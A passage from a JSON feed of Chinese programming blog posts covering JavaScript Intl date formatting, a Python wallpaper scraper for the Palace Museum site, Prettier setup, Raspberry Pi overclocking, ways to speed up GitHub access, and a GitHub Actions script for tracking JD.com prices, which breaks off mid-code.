文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\n// {locale: 'zh-CN', calendar: 'gregory', …}\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\n     // 基于一个固定日期计算，这里选择 1970.1.1\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\n    const base = new Date(1970, 0, 1).getTime()\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\n    return Array.from({ length: 7 }, (_, day) =&gt; (\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\n    ))\n}\n\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long',\n    hour: 'numeric',\n    minute: 'numeric',\n    second: 'numeric',\n}).formatToParts(new Date())\n// [\n//     { type: 'year', value: '2021' },\n//     { type: 'literal', value: '年' },\n//     { type: 'month', value: '10' },\n//     { type: 'literal', value: '月' },\n//     { type: 'day', value: '13' },\n//     { type: 'literal', value: '日' },\n//     { type: 'weekday', value: '星期三' },\n//     { type: 'literal', value: ' ' },\n//     { type: 'dayPeriod', value: '上午' },\n//     { type: 'hour', value: '1' },\n//     { type: 'literal', value: ':' },\n//     { type: 'minute', value: '00' },\n//     { type: 'literal', value: ':' },\n//     { type: 'second', value: '00' }\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\n}\n\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\n  timeZone: 'America/Los_Angeles',\n  year: 1995,\n  month: 12,\n  day: 7,\n  hour: 3,\n  minute: 24,\n  second: 30,\n  millisecond: 0,\n  microsecond: 3,\n  nanosecond: 500,\n  calendar: 'iso8601'\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span 